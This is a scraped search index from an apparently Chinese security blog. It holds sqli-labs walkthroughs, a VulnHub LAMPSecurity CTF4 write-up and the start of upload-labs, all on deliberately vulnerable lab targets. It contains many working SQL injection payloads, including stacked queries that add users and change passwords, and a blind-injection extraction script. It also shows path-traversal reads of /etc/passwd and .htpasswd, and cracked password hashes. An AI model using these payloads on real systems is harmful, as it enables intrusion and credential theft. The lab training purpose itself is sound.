0,1' at line 1 对cookie中的uname进行了查询处理 设置headerCookie: uname=' and updatexml(1,concat(0x7e,(length(database())),0x7e),1)# 后面的注入与报错注入类似 ","date":"2021-10-25","objectID":"/sqli-labs/:1:20","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-21 登录后返回 YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 YOUR IP ADDRESS IS : 192.168.8.1 DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE YOUR COOKIE : uname = YWRtaW4= and expires: Sat 08 May 2021 - 14:09:25 Your Login name:admin Your Password:admin Your ID:8 可以看到uname被base64转码 在header中设置Cookie: uname=J2FzZGY=回显You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'asdf') LIMIT 0,1' at line 1 可知uname的查询方式为('$uname') 对cookie中的uname进行了查询处理 设置headerCookie: uname=JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChsZW5ndGgoZGF0YWJhc2UoKSkpLDB4N2UpLDEpIw== 后面的注入与报错注入类似 ","date":"2021-10-25","objectID":"/sqli-labs/:1:21","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-22 与Less-21类似,把闭合方式换成\" ","date":"2021-10-25","objectID":"/sqli-labs/:1:22","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Advanced Injections ","date":"2021-10-25","objectID":"/sqli-labs/:2:0","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-23 传入?id='报错,说明闭合方式为',传入?id=-1' or 1=1-- ,发现-- 并没有生效,推测对注释符进行了过滤 传入?id=1' order by 4,'1,报错Unknown column '4' in 'order clause'说明一共有3列 注意要有'1来对最后的'进行闭合 查表名?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),'1 查列名?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),'1 查用户名?id=-1' union select 1,(select group_concat(username) from users),'1,查密码同理 也可以用报错注入?id=1' or updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e),1) or '1'='1 ","date":"2021-10-25","objectID":"/sqli-labs/:2:1","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-24 题目提示存在二次注入 注册用户名test,密码test,登录进入后发现存在密码修改选项,结合题目提示,猜测其应该是通过构造特殊的用户名达成二次注入,从而在密码修改处修改其他用户的密码 推测修改密码处的sql语句为update users set password='$password' where username='$username'... 假设注册一个新的用户名为test#',其在修改密码时构成了sql语句update users set password='xxx' where username='test'#'... 从而成功修改用户test的密码 猜测验证 注册用户test 注册用户test#' 对用户test#'的密码进行修改 源码分析 在login_create.php中 $username=mysql_escape_string($_POST['username']) ; $pass=mysql_escape_string($_POST['password']); $re_pass=mysql_escape_string($_POST['re_password']); $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\"; 在login.php中 function sqllogin(){ $username = mysql_real_escape_string($_POST[\"login_user\"]); $password = mysql_real_escape_string($_POST[\"login_password\"]); $sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\"; $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( '); $row = mysql_fetch_row($res); if ($row[1]) { return $row[1]; } else { return 0; } } $login = sqllogin(); if (!$login== 0) { $_SESSION[\"username\"] = $login; setcookie(\"Auth\", 1, time()+3600); header('Location: logged-in.php'); } 在pass_change.php中 $username=$_SESSION[\"username\"]; $curr_pass=mysql_real_escape_string($_POST['current_password']); $pass=mysql_real_escape_string($_POST['password']); $re_pass=mysql_real_escape_string($_POST['re_password']); $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; 可以得知$_SESSION[\"username\"]来源于数据库的查询结果,并没有经过转义处理,因此通过构造特殊的用户名即可达成二次注入 ","date":"2021-10-25","objectID":"/sqli-labs/:2:2","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-25 and和or被过滤 传入?id=-1' union select 1,2,'3成功闭合 传入?id=-1' union select 1,(select group_concat(username) from users),'3得到用户名 但是password中存在or被过滤 传入?id=-1' union select 1,(select group_concat(password) from users),'3,返回-1' union select 1,(select group_concat(passwd) from users),'3 推测存在关键词替换进而推测可能存在双写绕过 传入?id=-1' oorr 1=1--%20正常回显,返回结果为-1' or 1=1--,说明存在双写绕过 传入?id=-1' union select 1,(select group_concat(passwoorrd) from users),'3得到密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:3","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-25a 与Less-25但不用进行闭合 传入?id=-1 union select 1,(select group_concat(username) from users),3得到用户名 传入?id=-1 union select 1,(select group_concat(passwoorrd) from users),3得到密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:4","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-26 传入?id=-1////oorr****+++---******1=1返回1or1=1 注释符被过滤,可以使用%a0代替 传入?id=0'%a0oorr%a0'1'='1正常回显,返回0'�or�'1'='1 传入?id=0'%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),'3得到用户名 传入?id=0'%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),'3得到密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:5","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-26a 闭合方式改为') 传入?id=0')%a0oorr%a0'1'=('1正常回显,返回0'�or�'1'='1 传入?id=0')%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),('3得到用户名 传入?id=0')%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),('3得到密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:6","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-27 union被过滤,使用双写绕过ununionion select被过滤,使用双写+大写绕过selSelectect 传入?id=0'%a0or%a0'1'='1正常回显,返回0'�or�'1'='1 传入?id=0'%a0ununionion%a0seSelectlect%a01,(seSelectlect%a0group_concat(username)%a0from%a0users),'3得到用户名 传入?id=0'%a0ununionion%a0seSelectlect%a01,(seSelectlect%a0group_concat(password)%a0from%a0users),'3得到密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:7","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-27a 闭合方式改为\" ","date":"2021-10-25","objectID":"/sqli-labs/:2:8","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-28 闭合方式为')仅对注释符进行过滤 传入?id=0')%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),('3得到用户名 传入?id=0')%a0union%a0select%a01,(select%a0group_concat(password)%a0from%a0users),('3得到密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:9","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-28a 同上 ","date":"2021-10-25","objectID":"/sqli-labs/:2:10","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-29 传入?id=-1'/**/union/**/select/**/1,(select/**/group_concat(username)/**/from/**/users),'3得到用户名 传入?id=-1'/**/union/**/select/**/1,(select/**/group_concat(password)/**/from/**/users),'3得到密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:11","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-30 将闭合方式更换为\" ","date":"2021-10-25","objectID":"/sqli-labs/:2:12","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-31 将闭合方式更换为\") ","date":"2021-10-25","objectID":"/sqli-labs/:2:13","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-32 题目中对' \" \\进行了转义处理(addslashes),转义为\\' \\\" \\\\,使用宽字节注入进行绕过 mysql在使用GBK编码时,会认为两个字符为一个汉字,例如%c4%e3就是一个汉字(前一个ASCII码要大于128) 假设传入?id=%df',此时'被转义为\\',因此最终要执行sql查询的的参数为%df\\'而mysql将%df\\理解为一个汉字,从而让'逃逸出来 传入?id=%df'返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''�\\'' LIMIT 0,1' at line 1说明成功将'逃逸 传入?id=-1%df' or 1=1%23正常回显 传入?id=-1%df' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)%23返回列名,此时由于'users'需要用单引号但不能使用宽字节闭合,因此使用16进制代替 传入?id=-1%df' union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23得到用户名和密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:14","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-33 同上 ","date":"2021-10-25","objectID":"/sqli-labs/:2:15","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-34 同样是宽字节注入,使用POST传参 传入uname=a%df' union select (select group_concat(username) from users),(select group_concat(password) from users)%23\u0026passwd=a\u0026submit=Submit返回用户名和密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:16","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-35 不需要构造闭合 传入?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23返回用户名和密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:17","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-36 题目提示存在mysql_real_escape_string mysql_real_escape_string()调用mysql库的函数mysql_real_escape_string,在以下字符前添加反斜杠\\x00, \\n, \\r, \\, ', \"和\\x1a 同样可以使用宽字节注入 传入?id=-1%df' union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23得到用户名和密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:18","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-37 使用POST传参 传入uname=a%df' union select (select group_concat(username) from users),(select group_concat(password) from users)%23\u0026passwd=a\u0026submit=Submit返回用户名和密码 ","date":"2021-10-25","objectID":"/sqli-labs/:2:19","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Stacked Injections 堆叠注入 ","date":"2021-10-25","objectID":"/sqli-labs/:3:0","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-38 闭合方式为' 传入?id=-1' or 1=1;create table wdnmd like uesrs;%23创建新表 传入?id=-1' or 1=1;drop table wdnmd;%23删除表 传入?id=-1' or 1=1;insert into users(id,username,password) values(100,'wdnmd','wdnmd');%23新建用户 ","date":"2021-10-25","objectID":"/sqli-labs/:3:1","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-39 不需要进行闭合,其余步骤同上 ","date":"2021-10-25","objectID":"/sqli-labs/:3:2","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-40 闭合方式为'),其余步骤同上 ","date":"2021-10-25","objectID":"/sqli-labs/:3:3","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-41 同Less-39 ","date":"2021-10-25","objectID":"/sqli-labs/:3:4","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-42 同Less-24的二次注入 在password中传入123'返回报错信息,password的闭合方式为' 在password处填入1' or 1#使用万能密码登录 在password处填入123' or 1=1;insert into users(id,username,password) values(100,'wdnmd','wdnmd');#新建用户 在password处填入123' or 1=1;update users set password='asdf' where username='wdnmd';#修改用户密码 ","date":"2021-10-25","objectID":"/sqli-labs/:3:5","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-43 password的闭合方式为'),其余步骤同上 ","date":"2021-10-25","objectID":"/sqli-labs/:3:6","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-44 password的闭合方式为',但是在测试闭合方式时没有报错信息,其余步骤同上 ","date":"2021-10-25","objectID":"/sqli-labs/:3:7","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-45 password的闭合方式为'),但是在测试闭合方式时没有报错信息,其余步骤同上 ","date":"2021-10-25","objectID":"/sqli-labs/:3:8","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-46 order by注入,不需要进行闭合 利用rand进行注入 select * from users order by rand(0); select * from users order by rand(1); 例如select * from users order by rand(length(database())=8);可以根据回显数据排序的方式的不同来判断database名称的长度 select * from users order by rand(ascii(substr((select group_concat(username) from users),1,1))\u003c50);二分法确定名字 利用if进行延时注入 select * from users order by (if(ascii(substr((select group_concat(username) from users),1,1))\u003e100,1,sleep(0.1))); 如果group_concat(username)的首字母的ascii值大于100,则在正常时间内返回结果,如果不大于100,则会延迟一段时间(该时间并不直接等于sleep(0.1),而是与其查询的数据的条目数量相关,延迟时间 = sleeptime * number) 利用updatexml等进行报错注入 mysql\u003e select * from users order by updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: '~information_schema,c~' ","date":"2021-10-25","objectID":"/sqli-labs/:3:9","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-47 order by注入,闭合方式为' 可以使用if进行延时注入,也可以使用updatexml等进行报错注入 ","date":"2021-10-25","objectID":"/sqli-labs/:3:10","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-48 order by注入,不需要进行闭合 可以使用if进行延时注入,也可以使用rand等进行注入 ","date":"2021-10-25","objectID":"/sqli-labs/:3:11","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-49 order by注入,闭合方式为' 可以使用if进行延时注入 ","date":"2021-10-25","objectID":"/sqli-labs/:3:12","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-50 order by注入,不需要进行闭合,同时也可以使用堆叠注入 可以使用rand,if,updatexml进行注入 ","date":"2021-10-25","objectID":"/sqli-labs/:3:13","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-51 order by注入,闭合方式为',同时也可以使用堆叠注入 可以使用if,updatexml进行注入 ","date":"2021-10-25","objectID":"/sqli-labs/:3:14","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-52 order by注入,不需要进行闭合,同时也可以使用堆叠注入 可以使用rand,if进行注入 ","date":"2021-10-25","objectID":"/sqli-labs/:3:15","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-53 order by注入,闭合方式为',同时也可以使用堆叠注入 可以使用if,updatexml进行注入 ","date":"2021-10-25","objectID":"/sqli-labs/:3:16","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Challenges ","date":"2021-10-25","objectID":"/sqli-labs/:4:0","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-54 在10次测试中获取到密钥 判断闭合方式,得到闭合方式为',同时没有报错信息 判断列数,一共有3列?id=1' order by 3--%20 ?id=-1' union select 1,2,3--%20只有2,3列正常回显 ?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--%20获取表名 ?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='GFTILUL21Y')--%20获取列名 ?id=-1' union select 1,(select group_concat(id) from GFTILUL21Y),(select group_concat(sessid) from GFTILUL21Y)--%20获取id和sessid ?id=-1' union select 1,(select group_concat(secret_ZHH9) from GFTILUL21Y),(select group_concat(tryy) from GFTILUL21Y)--%20获取secret_ZHH9和tryy ","date":"2021-10-25","objectID":"/sqli-labs/:4:1","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-55 在14次测试中获取到密钥 判断闭合方式,得到闭合方式为),同时没有报错信息 其余方式同上 ","date":"2021-10-25","objectID":"/sqli-labs/:4:2","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-56 length(database())=10 在14次测试中获取到密钥 判断闭合方式,得到闭合方式为'),同时没有报错信息 其余方式同上 ","date":"2021-10-25","objectID":"/sqli-labs/:4:3","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-57 在14次测试中获取到密钥 判断闭合方式,得到闭合方式为\",同时没有报错信息 其余方式同上 ","date":"2021-10-25","objectID":"/sqli-labs/:4:4","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-58 在5次测试中获取到密钥 判断闭合方式,得到闭合方式为',传入1'返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 传入?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,20) from information_schema.tables where table_schema=database()),0x7e),1)--%20返回表名 传入?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,30) from information_schema.columns where table_name='DIJZ7NA09S'),0x7e),1)--%20返回列名 select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) 传入?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(secret_6WHE),1,30) from DIJZ7NA09S),0x7e),1)--%20得到密钥 ","date":"2021-10-25","objectID":"/sqli-labs/:4:5","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-59 在5次测试中获取到密钥 判断闭合方式,得知不需要进行闭合,传入1'返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1 其余同上 ","date":"2021-10-25","objectID":"/sqli-labs/:4:6","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-60 在5次测试中获取到密钥 判断闭合方式,传入?id=1\",返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"1\"\") LIMIT 0,1' at line 1,可知闭合方式为\") 其余同上 ","date":"2021-10-25","objectID":"/sqli-labs/:4:7","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-61 在5次测试中获取到密钥 判断闭合方式,传入?id=1',返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'')) LIMIT 0,1' at line 1,可知闭合方式为')) 其余同上 ","date":"2021-10-25","objectID":"/sqli-labs/:4:8","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-62 在130次测试中获取到密钥 判断闭合方式,传入?id=-1') or 1=1%23,正常回显,闭合方式为') 获取database长度,?id=-1') or length(database())=10%23 import requests import time url = 'http://127.0.0.1/Less-62/' def get_table_name(): table_name = \"\" for i in range(1, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=-1') or ascii(substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,%d,1))\u003e%d-- \" % (i, mid) r = requests.get(url + payload) if \"Angelina\" in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: return table_name table_name += chr(mid) def get_column_name(table_name): column_name = '' for i in range(11, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=-1') or ascii(substr((select binary group_concat(column_name) from information_schema.columns where table_name='%s') ,%d,1))\u003e%d-- \" % (table_name, i, mid) r = requests.get(url + payload) if \"Angelina\" in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: return column_name column_name += chr(mid) def get_secret(table_name, column_name): secret = '' for i in range(1, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=-1') or ascii(substr((select binary group_concat(%s) from %s) ,%d,1))\u003e%d-- \" % (column_name, table_name, i, mid) r = requests.get(url + payload) if \"Angelina\" in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: return secret secret += chr(mid) table_name = get_table_name() print(table_name) column_name = get_column_name(table_name) print(column_name[:11]) secret = get_secret(table_name, column_name[:11]) print(secret) ","date":"2021-10-25","objectID":"/sqli-labs/:4:9","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-63 在130次测试中获取到密钥 判断闭合方式,传入?id=-1' or 1=1%23,正常回显,闭合方式为' 其余同上 ","date":"2021-10-25","objectID":"/sqli-labs/:4:10","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-64 在130次测试中获取到密钥 判断闭合方式,传入?id=-1)) or 1%23,正常回显,闭合方式为)) 其余同上 ","date":"2021-10-25","objectID":"/sqli-labs/:4:11","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-65 在130次测试中获取到密钥 判断闭合方式,传入?id=-1\") or 1%23,正常回显,闭合方式为\") 其余同上 ","date":"2021-10-25","objectID":"/sqli-labs/:4:12","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["红队/提权/域渗透"],"content":"cc1导致无法正常编译 问题现象 gcc: error trying to exec 'cc1': execvp: No such file or directory 解决方法 export PATH=$PATH 然后重新编译 在反弹shell之后,局部环境变量发生改变,需要重新导出? windows添加用户时提示密码不满足要求 The password does not meet the password policy requirements. Check the minimum password length, password complexity and password history requirements. 密码必须符合复杂性要求 ","date":"2021-08-11","objectID":"/%E6%8F%90%E6%9D%83%E6%97%B6%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84%E5%9D%91/:0:0","tags":null,"title":"提权时遇到过的坑","uri":"/%E6%8F%90%E6%9D%83%E6%97%B6%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84%E5%9D%91/"},{"categories":["VulnHub"],"content":"https://www.vulnhub.com/entry/lampsecurity-ctf4,83/ ","date":"2021-07-18","objectID":"/vulnhub-lampsecurity_ctf4/:0:0","tags":null,"title":"VulnHub-LAMPSECURITY:CTF4","uri":"/vulnhub-lampsecurity_ctf4/"},{"categories":["VulnHub"],"content":"初始操作 下载之后,打开靶机,检查靶机网卡,发现使用的是vm里面的专用网络 因此将Arch的网卡同样修改成专用网络(或者直接设置成双网卡),对子网进行扫描,确认靶机ip 靶机ip为172.16.228.128,对其进行详细扫描 robots.txt中显示 User-agent: * Disallow: /mail/ Disallow: /restricted/ Disallow: /conf/ Disallow: /sql/ Disallow: /admin/ /conf/访问报错,/restricted/,/mail/,/admin/都需要登录 /sql/目录可以直接查看,/sql/db.sql可以被直接访问,内容如下 use ehks; create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null); create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null); create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null); 使用dirsearch对网站进行目录扫描,得到pages目录可以直接查看 ","date":"2021-07-18","objectID":"/vulnhub-lampsecurity_ctf4/:1:0","tags":null,"title":"VulnHub-LAMPSECURITY:CTF4","uri":"/vulnhub-lampsecurity_ctf4/"},{"categories":["VulnHub"],"content":"sql注入1 进入blog.php,报错Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 9,因此存在报错注入 将index.html?page=blog\u0026title=Blog\u0026id=2中的id进行修改,修改成index.html?page=blog\u0026title=Blog\u0026id=2%27,会发生报错 index.html?page=blog\u0026title=Blog\u0026id=2 order by 6-- 会发生报错,说明一共有5个字段 index.html?page=blog\u0026title=Blog\u0026id=20 union select null,group_concat(cast(schema_name as char)),null,null,null from information_schema.schemata--+列出数据库的库名 index.html?page=blog\u0026title=Blog\u0026id=20 union select null,group_concat(cast(table_name as char)),null,null,null from information_schema.tables where table_schema='ehks'--+列出ehks的表 index.html?page=blog\u0026title=Blog\u0026id=20 union select null,group_concat(cast(column_name as char)),null,null,null from information_schema.columns where table_name='user'--+列出ehks.user的列 index.html?page=blog\u0026title=Blog\u0026id=20 union select null,null,user_name,null,user_pass from user--+列出用户名和密码(进行了hash) 密码长度与md5一致,猜测为md5,但不确定是否有加盐,批量反查结果如下 02e823a15a392b5aa4ff4ccb9060fa68 ilike2surf b46265f1e7faa3beab09db5c28739380 seventysixers 8f4743c04ed8e5f39166a81f26319bb5 Homesite 7c7bc9f465d86b8164686ebb5151a717 Sue1978 64d1f88b9b276aece4b0edcc25b7a434 pacman 9f3eb3087298ff21843cc4e013cf355f undone1 均可进入/admin/后台,测试同样可以作为ssh连接并提权到root ssh连接可能会报错no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 解决方法:需要在/etc/ssh/ssh_config中添加KexAlgorithms +diffie-hellman-group1-sha1然后执行sudo ssh-keygen -A ","date":"2021-07-18","objectID":"/vulnhub-lampsecurity_ctf4/:2:0","tags":null,"title":"VulnHub-LAMPSECURITY:CTF4","uri":"/vulnhub-lampsecurity_ctf4/"},{"categories":["VulnHub"],"content":"路径穿越 注意到url中的访问格式index.html?page=blog\u0026title=Blog\u0026id=2,推测其调用方式为include($_GET[$page].'.php') 而Wappalyzer的分析结果显示其php版本为5.1.2,因此存在00截断 index.html?page=../../../../../../../etc/passwd%00 对/restricted/.htaccess进行读取,index.html?page=../restricted/.htaccess%00 AuthType Basic AuthName \"Restricted - authentication required\" AuthUserFile /var/www/html/restricted/.htpasswd Require valid-user 对/restricted/.htpasswd进行读取,index.html?page=../restricted/.htpasswd%00 ghighland:8RkVRDjjkJhq6 pmoore:xHaymgB2KxbJU jdurbin:DPdoXSwmSWpYo sorzek:z/a8PtVaqxwWg .htpasswd的加密方式:https://httpd.apache.org/docs/current/misc/password_encryptions.html 用https://www.openwall.com/john/来进行破解 ","date":"2021-07-18","objectID":"/vulnhub-lampsecurity_ctf4/:3:0","tags":null,"title":"VulnHub-LAMPSECURITY:CTF4","uri":"/vulnhub-lampsecurity_ctf4/"},{"categories":["VulnHub"],"content":"sql注入2 查看admin/index.php的网页源代码,发现其对输入用户名和密码的过滤写在了js中 \u003cscript type=\"text/javascript\"\u003e function fixLogin() { var test=/[^a-zA-Z0-9]/g; document.login_form.username.value=document.login_form.username.value.replace(test, ''); document.login_form.password.value=document.login_form.password.value.replace(test, ''); } \u003c/script\u003e 抓包修改即可,得到报错select user_id from user where user_name=''' AND user_pass = md5('''),说明其闭合方式为' 传入username=' or '1'='1\u0026password=') or 1=1#,其sql语句为select user_id from user where user_name='' or '1'='1' AND user_pass = md5('') or 1=1#')即可登录成功 在post blog界面存在xss攻击的可能,传入\u003c/p\u003exxx\u003cp\u003e,即可进行闭合,使其中的xxx内容得以执行 ","date":"2021-07-18","objectID":"/vulnhub-lampsecurity_ctf4/:4:0","tags":null,"title":"VulnHub-LAMPSECURITY:CTF4","uri":"/vulnhub-lampsecurity_ctf4/"},{"categories":["靶场"],"content":"upload-labs upload-labs是一个使用php语言编写的,专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场,旨在帮助大家对上传漏洞有一个全面的了解 目前一共20关,每一关都包含着不同上传方式,建议使用windows环境 https://github.com/AMDyesIntelno/huaQ/tree/master/%E9%9D%B6%E5%9C%BA/upload-labs(%E5%B7%B2%E5%AE%8C%E6%88%90) ","date":"2021-01-25","objectID":"/upload-labs/:0:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-01 绕过js function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"请选择要上传的文件!\"); return false; } //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) { var errMsg = \"该文件不允许上传,请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; } } 上传后缀为.jpg的webshell然后burpsuite捉包改后缀名为.php即可 ","date":"2021-01-25","objectID":"/upload-labs/:1:0","tags":null,"title":"upload-labs(已完成)","uri":"/upload-labs/"},{"categories":["靶场"],"content":"Pass-02 绕过MIME $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = 